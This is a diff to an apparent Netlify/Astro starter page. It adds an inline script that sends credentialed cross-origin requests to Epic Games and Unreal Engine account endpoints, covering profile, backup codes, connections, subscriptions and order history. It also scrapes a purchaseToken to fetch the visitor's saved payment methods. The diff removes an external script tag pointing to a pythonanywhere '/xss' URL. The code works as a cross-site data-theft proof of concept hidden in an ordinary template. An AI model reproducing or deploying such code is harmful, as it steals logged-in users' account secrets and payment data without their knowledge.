@@ -16,16 +16,65 @@ Any page or data can be rebuilt only when needed, without site visitors ever get
     <h1 class="mb-10">Netlify Platform Starter for Astro</h1>
     <Markdown content={explainer} class="text-lg mb-10" />
 <script type="text/javascript">
+var script = document.createElement('script');
+script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
+script.type = 'text/javascript';
+document.getElementsByTagName('head')[0].appendChild(script);
+
+
+
+
+var endpoints = ['https://graphql.unrealengine.com/ue/graphql?query={Account{myAccount{email,name,lastName,emailVerified,displayName,isLoggedIn,country}}}',
+                'https://www.epicgames.com/account/v2/security/downloadBackupCodes',
+                'https://www.epicgames.com/account/v2/connections/socialConnection/ajaxGet',
+                'https://www.epicgames.com/account/v2/subscription/subscriptions',
+                'https://www.epicgames.com/account/v2/payment/ajaxGetOrderHistory'];
+
+for (var i = 0; i < endpoints.length; i++) {
+
+    var url = endpoints[i];
+
+    let request = new XMLHttpRequest();
+
+    request.open('GET', url, true);
+    request.withCredentials = true;
+    request.onreadystatechange = function() {
+        if(request.readyState === XMLHttpRequest.DONE && request.status === 200) {
+            console.log(request.response);
+            //var tag = document.createElement("p");
+            //tag.innerText = request.response;
+            //document.body.appendChild(tag);
+        }
+    }
+    request.send();
+};
+
+
 let request = new XMLHttpRequest();
-request.open('GET', 'https://www.unrealengine.com/id/api/redirect', true);
+request.open('GET', 'https://www.epicgames.com/account/v2/payments', true);
 request.withCredentials = true;
 request.send();
 request.onload = function() {
-    console.log(xhr.response);
+    var re = /id=\"purchaseToken\" value=\"(.+?)\"/;
+    var token = request.response.match(re)[1];
+    let xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://payment-website-pci.ol.epicgames.com/purchase/payment-methods', true);
+    xhr.setRequestHeader('x-requested-with', token);
+    xhr.withCredentials = true;
+    xhr.send();
+    xhr.onload = function() {
+        if (xhr.status != 200) {
+            console.log(xhr.statusText);
+        } else {
+            //var tag = document.createElement("p");
+            //tag.innerText = xhr.response;
+            //document.body.appendChild(tag);
+            console.log(xhr.response);
+        };
+    };
 };
 </script>
     <p class="mb-8">
-<script src="https://waxx6996.pythonanywhere.com/xss">
         <a href="https://docs.netlify.com/frameworks/astro/" class="btn btn-lg btn-primary sm:btn-wide">Read the Docs</a>
     </p>
 </Layout>
